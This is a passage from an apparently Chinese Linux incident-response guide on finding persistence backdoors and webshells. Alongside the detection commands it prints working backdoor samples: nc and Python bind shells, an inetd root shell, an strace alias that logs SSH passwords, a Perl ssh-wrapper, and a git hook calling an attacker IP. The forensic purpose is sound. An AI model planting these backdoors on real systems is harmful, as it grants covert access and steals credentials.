<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/systemd/system/</span><br><span class="line">/run/system/system/</span><br><span class="line">[/usr]/lib/systemd/system/</span><br><span class="line">/etc/rc.*    </span><br></pre></td></tr></table></figure>

<p>以下给出一个例子，systemd自启动后门运行的检查过程。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 发现开机自启动项存在名为backdoor的服务，同时网络端口上有个nc监听在41111口上。</span></span><br><span class="line">systemctl list-unit-files --type service |grep enabled</span><br><span class="line">netstat -ntaup</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看该service文件发现以下内容，这是一段bindshell指令。</span></span><br><span class="line">cat /usr/lib/systemd/system/backdoor.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Just a simple backdoor for test</span><br><span class="line">After=network.target</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=bash -c &quot;nc -l -p 41111 -e /bin/bash &amp;&quot;</span><br><span class="line">ExecReload=</span><br><span class="line">ExecStop=</span><br><span class="line">PrivateTmp=true</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<h4 id="1-3-2-x-inetd后门"><a href="#1-3-2-x-inetd后门" class="headerlink" title="1.3.2 (x)inetd后门"></a>1.3.2 (x)inetd后门</h4><p>inetd是早期的超级任务管理程序，后来被xinetd代替。目前不少系统默认没有安装并开启xinetd。但请注意，系统内开启了telnet则一定要检查(x)inetd。</p>
<p>一个典型的inetd后门形如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这是一个bindshell后门</span></span><br><span class="line"><span class="meta">#</span><span class="bash">inetd进程监听着某端口</span></span><br><span class="line">netstat -ntaup|grep inetd</span><br><span class="line"></span><br><span class="line">cat /etc/inetd.conf #发现存在daytime stream tcp nowait /bin/sh sh –I</span><br><span class="line"></span><br><span class="line">cat /etc/services |grep daytime #发现daytime服务绑定在(13/*)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个典型的xinetd后门形如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这是一个bindshell后门</span></span><br><span class="line">cat /etc/xinet.d/safe-guard.xinetd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default: yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> description: The safe-guard server servestelnet sessions;</span></span><br><span class="line">service safe-guard</span><br><span class="line">&#123;</span><br><span class="line">  flags = REUSE</span><br><span class="line">  socket_type = stream</span><br><span class="line">  wait = no</span><br><span class="line">  user = root</span><br><span class="line">  server =/bin/bash</span><br><span class="line">  log_on_failure += USERID</span><br><span class="line">  disable = no</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cat /etc/services |grep safe-guard</span><br><span class="line">safe-guard      58888/tcp               # CentOS safe-guard master daemon</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以在排查时关注脚本文件内是否含有以下字符串：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash</span><br><span class="line">/bin/sh</span><br><span class="line">/usr/sbin/in.telnetd</span><br><span class="line">/usr/sbin/in.rshd</span><br><span class="line">/usr/sbin/in.rlogind</span><br><span class="line">/usr/sbin/in.rexecd</span><br></pre></td></tr></table></figure>

<h3 id="1-4-篡改shell及公共配置文件"><a href="#1-4-篡改shell及公共配置文件" class="headerlink" title="1.4 篡改shell及公共配置文件"></a>1.4 篡改shell及公共配置文件</h3><h4 id="1-4-1-别名后门"><a href="#1-4-1-别名后门" class="headerlink" title="1.4.1 别名后门"></a>1.4.1 别名后门</h4><p>命令别名后门通过在shell配置文件及公共配置文件中定义alias/hash等命令诱导用户使用被篡改的命令。排查方式比较简单，检查文档中是否出现此类关键字就行。一般来说，默认的alias即使有命令也普遍集中于ls/grep。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=(/etc/profile /etc/bashrc ~/.bashrc ~/.bash_file ~/.profile)</span><br><span class="line">for i in `echo $a`;do grep &quot;alias\|hash&quot; $i; done</span><br></pre></td></tr></table></figure>

<p>常见的别名后门，如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在/etc/profile内<span class="built_in">alias</span>+strace+ssh偷密码：</span></span><br><span class="line">alias ssh=&#x27;strace -o /tmp/sshwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read -s 2048 ssh&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在/etc/profile内添加了如下命令：</span></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=32110 &#125;;alerts&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在~/.bashrc中添加如下命令：</span></span><br><span class="line">alias sudo=&#x27;/tmp/.sudo&#x27;</span><br></pre></td></tr></table></figure>

<p>不常见的，如：<br>利用hash命令，劫持常用命令。hash 用于查看terminal创建后某项命令程序的使用次数。hash -p参数可以用来设置某个二进制程序的运行别名，如果在/etc/profile内预先执行能达到类似于alias后门的效果。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hash -p /tmp/su-backdoor su </span><br><span class="line">hash -p /tmp/sudo-backdoor sudo</span><br></pre></td></tr></table></figure>

<h4 id="1-4-2-篡改环境变量"><a href="#1-4-2-篡改环境变量" class="headerlink" title="1.4.2 篡改环境变量"></a>1.4.2 篡改环境变量</h4><p>程序的运行普遍依赖一定的环境变量，篡改环境变量可以改变程序的资源分配甚至改变使用者本想运行的命令。攻击者通过在shell配置文件及公共配置文件中设置环境变量的值达到影响程序的目的。</p>
<h5 id="PATH后门"><a href="#PATH后门" class="headerlink" title="$PATH后门"></a>$PATH后门</h5><p>攻击类型1：篡改$PATH</p>
<p>攻击者修改$PATH，手工加入更高优先级的目录，并放入同名后门程序，用来劫持常用的命令。排查命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;PATH=\|:\$PATH&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;PATH=\|:\$PATH&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;PATH=\|:\$PATH&quot; /etc/bashrc 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>检查结果中是否存在非常见的目录如：家目录、/tmp目录。</p>
<p>攻击类型2：利用$PATH的缺陷。</p>
<p>攻击者在现有的高优先级的目录中放置同名后门程序，劫持低目录中的程序。排查命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 例如攻击者通过在/usr/<span class="built_in">local</span>/sbin或/usr/<span class="built_in">local</span>/bin中部署后门程序如sudo，可以优先于原本/usr/bin/sudo执行。</span></span><br><span class="line">find /usr/local/sbin -perm -100 -type f&gt; 1.txt</span><br><span class="line">find /usr/local/bin -perm -100 -type f &gt;&gt;1.txt</span><br><span class="line">find /home -perm -100 -type f &gt;&gt;1.txt</span><br><span class="line">find /root -perm -100 -type f &gt;&gt;1.txt</span><br><span class="line">cat 1.txt|sort|uniq -c|sort -nr|head -n 10</span><br></pre></td></tr></table></figure>

<h5 id="PROMPT-COMMAND后门"><a href="#PROMPT-COMMAND后门" class="headerlink" title="$PROMPT_COMMAND后门"></a>$PROMPT_COMMAND后门</h5><p>该环境变量通俗来说用于在执行每条命令前执行命令，不少运维人员利用它来做历史记录加固，但是攻击者同样可以利用它来插入后门逻辑。排查命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;PROMPT_COMMAND&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;PROMPT_COMMAND&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;PROMPT_COMMAND&quot; /etc/bashrc 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>正常的该环境变量内容应该是关于shell的界面显示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">    PROMPT_COMMAND=<span class="string">&#x27;echo -ne &quot;\033]0;$&#123;USER&#125;@$&#123;HOSTNAME&#125;: $&#123;PWD&#125;\007&quot;&#x27;</span></span></span><br></pre></td></tr></table></figure>

<p>或是结合历史记录加固的：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -a; history -a; printf &quot;\033]0;%s@%s:%s\007&quot; &quot;$&#123;USER&#125;&quot; &quot;$&#123;HOSTNAME%%.*&#125;&quot; &quot;$&#123;PWD/#$HOME/~&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>而下面这种情况是一条利用环境变量来做bind shell的后门。每一次执行先检查端口有没有占用，如果没占用，立马开一个后门端口。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PROMPT_COMMAND=&quot;lsof -i:23333 &amp;&gt;/dev/null || (python2 -c \&quot;exec(&#x27;aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwyMzMzMykpCnMubGlzdGVuKDEpCihjLGEpPXMuYWNjZXB0KCkKd2hpbGUgMToKIGQ9Yy5yZWN2KDUxMikKIGlmICdleGl0JyBpbiBkOgogIHMuY2xvc2UoKQogIHN5cy5leGl0KDApCiByPW9zLnBvcGVuKGQpLnJlYWQoKQogYy5zZW5kKHIpCg==&#x27;.decode(&#x27;base64&#x27;))\&quot; 2&gt;/dev/null &amp;)&quot;</span><br></pre></td></tr></table></figure>

<h5 id="LD-PRELOAD后门"><a href="#LD-PRELOAD后门" class="headerlink" title="$LD_PRELOAD后门"></a>$LD_PRELOAD后门</h5><p>$LD_PRELOAD用于指定程序动态库的加载。动态库的加载满足下面的定义顺序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">LD_PRELOAD&gt;<span class="variable">$LD_LIBRARY_PATH</span>&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/lib</span></span><br></pre></td></tr></table></figure>

<p>故而，攻击者利用该环境变量定义的库文件可以实现对函数的劫持。</p>
<p>排查命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;LD_PRELOAD&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;LD_PRELOAD&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;LD_PRELOAD&quot; /etc/bashrc 2&gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash">观察结果内是否存在形如：<span class="built_in">export</span> LD_PRELOAD=/xxxx/xxx.so</span></span><br></pre></td></tr></table></figure>

<p>如果系统内正在运行的进程存在加载了该环境变量的可能，通过检查/proc/*/environ也能快速定位到受影响的进程。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/*/environ |tr &#x27;\0&#x27; &#x27;\n&#x27;|grep LD_PRELOAD</span><br><span class="line">grep -rn LD_PRELOAD /proc/*/environ</span><br></pre></td></tr></table></figure>

<h5 id="LD-LIBRARY-PATH后门"><a href="#LD-LIBRARY-PATH后门" class="headerlink" title="$LD_LIBRARY_PATH后门"></a>$LD_LIBRARY_PATH后门</h5><p>与$LD_PRELOAD后门检测方法基本一致：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -n &quot;LD_LIBRARY_PATH&quot; ~/.* 2&gt;/dev/null</span><br><span class="line">grep -rn &quot;LD_LIBRARY_PATH&quot; /etc/profi* 2&gt;/dev/null</span><br><span class="line">grep -n &quot;LD_LIBRARY_PATH&quot; /etc/bashrc 2&gt;/dev/null</span><br><span class="line"><span class="meta">#</span><span class="bash"> 观察结果内是否存在形如：<span class="built_in">export</span> LD_LIBRARY_PATH =/xxxx/xxx.so</span></span><br></pre></td></tr></table></figure>

<h3 id="1-5-篡改库文件"><a href="#1-5-篡改库文件" class="headerlink" title="1.5 篡改库文件"></a>1.5 篡改库文件</h3><h4 id="1-5-1-pam后门"><a href="#1-5-1-pam后门" class="headerlink" title="1.5.1 pam后门"></a>1.5.1 pam后门</h4><p>“Linux-PAM（即linux可插入认证模块）是一套共享库,使本地系统管理员可以随意选择程序的认证方式。换句话说，不用(重新编写)重新编译一个包含PAM功能的应用程序，就可以改变它使用的认证机制，这种方式下，就算升级本地认证机制,也不用修改程序。”换个角度来看，如果攻击者可以通过篡改pam模块达到劫持认证的目的。</p>
<p>PAM配置应用认证方式的文件在/etc/pam.d/目录下。调用的模块库:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RHEL:/usr/lib64/security/</span><br><span class="line">Debian: /usr/lib/x86_64-linux-gnu/security/</span><br></pre></td></tr></table></figure>

<p>主要的利用方式有两种：</p>
<p>（1）    篡改配置文件，加入攻击者自定义的pam库文件。<br>sshLooterC就是这样一个工具。 <a target="_blank" rel="noopener" href="https://github.com/mthbernardes/sshLooterC">https://github.com/mthbernardes/sshLooterC</a><br>试了下RHEL上可以运行，Debian上有些问题，通过在/etc/pam.d/common-auth中插入编译好的so文件，并将编译好的劫持库放到目录下即可。</p>
<p>取证的方法就是检查配置文件有没有被篡改。如果系统支持包管理检查的话，可以确认以下有没有配置文件被改了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -V `rpm -qf /etc/pam.d/system-auth`</span><br></pre></td></tr></table></figure>

<p>（2）    源码修改并替换库文件，从而实现后门植入。<br>下面两篇文章中，作者分别实现了这种方式的后门植入。<br>Debian:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/adhzl/p/12098397.html">https://www.cnblogs.com/adhzl/p/12098397.html</a><br>RHEL:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7902">https://xz.aliyun.com/t/7902</a></p>
<p>取证的过程分为以下几步：</p>
<ol>
<li>   确定pam版本。rpm -qa | grep pam（或，dpkg -l | grep pam）</li>
<li>   下载对应版本源码。<a target="_blank" rel="noopener" href="http://www.linux-pam.org/library/">http://www.linux-pam.org/library/</a></li>
<li>   编译。（./configure &amp;&amp; make）</li>
<li>   比较so文件散列值。</li>
<li>   分析异常so文件。</li>
</ol>
<p>pam对大多数人而言可能比较生疏，这里有一些文章可以看看。<br>[1] Linux下PAM模块学习总结<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevingrace/p/8671964.html">https://www.cnblogs.com/kevingrace/p/8671964.html</a></p>
<h4 id="1-5-2-etc-ld-so-cache"><a href="#1-5-2-etc-ld-so-cache" class="headerlink" title="1.5.2 /etc/ld.so.cache"></a>1.5.2 /etc/ld.so.cache</h4><p>/etc/ld.so.cache可以认为是程序的动态链接库字典，需要动态链接的程序会在系统内的动态加载器的帮助下读取/etc/ld.so.cache进而获得要用到的库文件。因而攻击者通过篡改该文件的内容，可以实现插入后门劫持程序运行的效果。这一技术在一些rootkit中常被使用。</p>
<p>检查方式是确定库文件的归属，通过下载对应版本的安装包或使用包管理器检查该库文件是否被篡改。</p>
<p>（1）下面的例子中使用包管理器检查某库文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">以debian下某库文件libBLT为例</span></span><br><span class="line">cat /etc/ld.so.cache|tr &#x27;\0&#x27; &#x27;\n&#x27; |grep libBLT</span><br><span class="line">ls -il /lib/libBLT.2.5.so.8.6 #获得inode</span><br><span class="line">dkpg -S /usr/lib/libBLT.2.5.so.8.6 #获得二进制所属的包</span><br><span class="line">dpkg -V tk8.6-blt2.5 #dpkg自检</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">RHEL下</span></span><br><span class="line">rpm -qf $filename</span><br><span class="line">rpm -V $package</span><br></pre></td></tr></table></figure>

<p>（2）下面的例子中通过比对官方包散列值来检查某库文件。</p>
<p>Debian系：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get download xxx					#只下载</span><br><span class="line">dpkg -X ./xxx.deb extract				#解压到extract目录</span><br></pre></td></tr></table></figure>

<p>RHEL系：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install --downloadonly --downloaddir=/tmp/ XXX	#只下载</span><br><span class="line">rpm2cpio xxx.rpm | cpio -div						#解压到当前目录</span><br></pre></td></tr></table></figure>

<p>将待分析的so文件与解压后得到的文件使用md5sum比对散列值。</p>
<h4 id="1-5-3-etc-ld-so-preload"><a href="#1-5-3-etc-ld-so-preload" class="headerlink" title="1.5.3 /etc/ld.so.preload"></a>1.5.3 /etc/ld.so.preload</h4><p>网上不少文章提到该库文件，但看了一下本人的好几套环境上都没有该配置文件，因此真实性不做保证。这里留下来只是作为以防万一。</p>
<p>该配置文件作用与LD_PRELOAD类似，帮助程序预先加载一些库文件，内容与/etc/ld.so.cache。</p>
<p>因此，排查方法与/etc/ld.so.cache类似，使用包管理器确定其中的库文件来源并检查库文件是否被篡改。</p>
<h3 id="1-6-篡改命令文件"><a href="#1-6-篡改命令文件" class="headerlink" title="1.6 篡改命令文件"></a>1.6 篡改命令文件</h3><p>篡改文件有两类常见的手法，一类是用含有后门逻辑的脚本文件替换掉命令文件，一类通过修改文件源码再编译。</p>
<p>使用包管理器检查能检查通过包管理器安装的程序。对于不支持包管理检查的文件或系统，发现脚本类替换相对容易，但发现源码修改再编译的后门则比较困难。</p>
<h4 id="1-6-1-包管理器自检"><a href="#1-6-1-包管理器自检" class="headerlink" title="1.6.1 包管理器自检"></a>1.6.1 包管理器自检</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RHEL：rpm -aV</span><br><span class="line">Debian：dpkg -V</span><br></pre></td></tr></table></figure>

<p>这种方式依赖系统内包管理器可正常工作的情况。同时还要求被查的软件或二进制是采用源安装方式。如果采用pip，源码编译等方式进行安装，那就发现不了。</p>
<h4 id="1-6-2-检查脚本文件"><a href="#1-6-2-检查脚本文件" class="headerlink" title="1.6.2 检查脚本文件"></a>1.6.2 检查脚本文件</h4><p>使用下面给出的命令能快速检查常用程序目录下的脚本是否属于被篡改的脚本，如果包管理没有识别到该脚本的归属，单独查看内容进行分析即可，不常见的命令可以不用管。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Debian:</span></span><br><span class="line">find /usr/*bin /usr/local/*bin -type f -exec file &#123;&#125; \; |grep -v ELF|awk -F: &#x27;&#123;print $1&#125;&#x27;|xargs dpkg -S|awk -F: &#x27;&#123;print $1&#125;&#x27;|dpkg -V</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RHEL:</span></span><br><span class="line">find /usr/*bin /usr/local/*bin -type f -exec file &#123;&#125; \; | grep -v ELF|awk -F: &#x27;&#123;print $1&#125;&#x27;|xargs rpm -qf|sort -n|uniq|xargs rpm -V</span><br></pre></td></tr></table></figure>

<h4 id="1-6-3-检查ELF文件"><a href="#1-6-3-检查ELF文件" class="headerlink" title="1.6.3 检查ELF文件"></a>1.6.3 检查ELF文件</h4><p>（1）文件校验<br>实际场景下很少做这种检查，因为这种方法难以在取证场景下大量快速的展开，消耗时间与人力代价很大。</p>
<p>下面以一个OpenSSH后门排查为例。</p>
<p>首先确定二进制归属与版本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg -S /usr/sbin/sshd</span><br><span class="line">dpkg -l openssh-server</span><br><span class="line">(RHEL下对应于rpm -qf /usr/sbin/sshd结果直接包含版本号)</span><br></pre></td></tr></table></figure>

<p>接着去开源社区搜一下，下载对应的deb包或rpm包、bin包。通过解压或执行的方式获得其中的二进制文件，算一遍散列值进行比对。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Debian-deb：</span></span><br><span class="line">dpkg -X ./xxx.deb extract	#解压到extract目录</span><br><span class="line">dpkg -i ./xxx.deb			#安装该deb包</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RHEL-rpm：</span></span><br><span class="line">rpm2cpio xxx.rpm | cpio -div	#解压到当前目录</span><br><span class="line">rpm -i xxx.rpm			#安装该rpm包</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bin文件：</span></span><br><span class="line">chmod +x xxx.bin; ./xxx.bin</span><br></pre></td></tr></table></figure>

<p>这类文件比较特殊，可以在虚拟机里面安装后获得二进制，再算散列值。</p>
<p>（2）进程分析<br>这种排查方式的代价更高，同时可能需要沙箱环境。如果这种进程分析搞不定可能还需要文件逆向分析。</p>
<p>以进程分析OpenSSH后门为例。starce -ff -p $sshd_pid可以捕获到的正常的SSH登录中抓到的账户名及密码。如果OpenSSH-Server被篡改了，那么在该部分往后应该会有读写文件或创建socket外发的操作，具体的操作取决于攻击者的手段与目的（窃取型的可以直接写到本地也可以创建socket外发，口令鉴权绕过的除了硬编码口令应该也会存在其他绕过手段）。实际操作起来还会有很多问题，时间代价与精力代价都很高。</p>
<p>下面是一些此类后门的相关文章。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bigdevilking/p/9535427.html">https://www.cnblogs.com/bigdevilking/p/9535427.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jouny/p/4688194.html">https://www.cnblogs.com/jouny/p/4688194.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/153364.html">https://www.freebuf.com/news/153364.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/croso/p/5280783.html">https://www.cnblogs.com/croso/p/5280783.html</a><br><a target="_blank" rel="noopener" href="https://www.moonsec.com/archives/1720">https://www.moonsec.com/archives/1720</a></p>
<p>（3）逆向工程</p>
<p>略。</p>
<h4 id="1-6-4-条件触发型后门"><a href="#1-6-4-条件触发型后门" class="headerlink" title="1.6.4 条件触发型后门"></a>1.6.4 条件触发型后门</h4><p>在正常使用操作中，用户无法感知，只有满足一定条件下才能触发后门逻辑的后门。检查的重点在于文件是否被篡改。有以下几种方式能够帮助检查：1.包管理器自检；2.md5sum比对；3.查看文件内容。</p>
<p>下面是一个典型ssh-wrapper后门的形式。此后门要求连接ssh的源端口满足指定的条件就能出发任意密码登录。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line">vi sshd</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/perl</span></span><br><span class="line">exec&quot;/bin/sh&quot;if(getpeername(STDIN)=~/^..4A/);</span><br><span class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line"><span class="meta">#</span><span class="bash">netstat -ntuap结果无异常<span class="built_in">bind</span>端口，无异常socket连接。但用socat指定源端口登录时会直接登陆上</span></span><br><span class="line">socat STDIO TCP4:10.18.180.20:22,sourceport=13377</span><br></pre></td></tr></table></figure>

<h3 id="1-7-其他"><a href="#1-7-其他" class="headerlink" title="1.7 其他"></a>1.7 其他</h3><h4 id="1-7-1-ssh软链接后门"><a href="#1-7-1-ssh软链接后门" class="headerlink" title="1.7.1 ssh软链接后门"></a>1.7.1 ssh软链接后门</h4><p>软链接后门是一种比较特殊的后门，形式如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /xxx/su;/xxx/su -oPort=$port_num</span><br></pre></td></tr></table></figure>

<p>使用ps aux &amp;&amp; netstat -ntaup等命令查看进程名时能快速发现该后门，特点在于文件名必须为su。</p>
<h4 id="1-7-2-Git-hooks后门（未证实）"><a href="#1-7-2-Git-hooks后门（未证实）" class="headerlink" title="1.7.2 Git hooks后门（未证实）"></a>1.7.2 Git hooks后门（未证实）</h4><p>利用git commit时触发反弹shell的逻辑。典型形式如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;xterm -display &lt;attacker IP&gt;:1 &amp;&quot; &gt; .git/hooks/pre-commit</span><br><span class="line">chmod +x .git/hooks/pre-commit</span><br><span class="line"></span><br><span class="line">Xnest:1</span><br></pre></td></tr></table></figure>

<p>排查方式：所有本地的仓库内是否含有该文件及xterm关键字。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name .git -exec grep -nr xterm &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h2 id="2-webshell-分析"><a href="#2-webshell-分析" class="headerlink" title="2 webshell 分析"></a>2 webshell 分析</h2><p>在web安全中，我们常用webshell实现对网站的控制，对于有文件的webshell，进行查找和取证相对容易。</p>
<h3 id="2-1-常用webshell专杀工具"><a href="#2-1-常用webshell专杀工具" class="headerlink" title="2.1 常用webshell专杀工具"></a>2.1 常用webshell专杀工具</h3><p>D盾 <a target="_blank" rel="noopener" href="http://www.d99net.net/down/d_safe_2.1.5.4.zip">http://www.d99net.net/down/d_safe_2.1.5.4.zip</a></p>
<p>河马webshell查杀 <a target="_blank" rel="noopener" href="https://www.shellpub.com/">https://www.shellpub.com/</a></p>
<p>安全狗 <a target="_blank" rel="noopener" href="http://free.safedog.cn/website_safedog.html">http://free.safedog.cn/website_safedog.html</a></p>
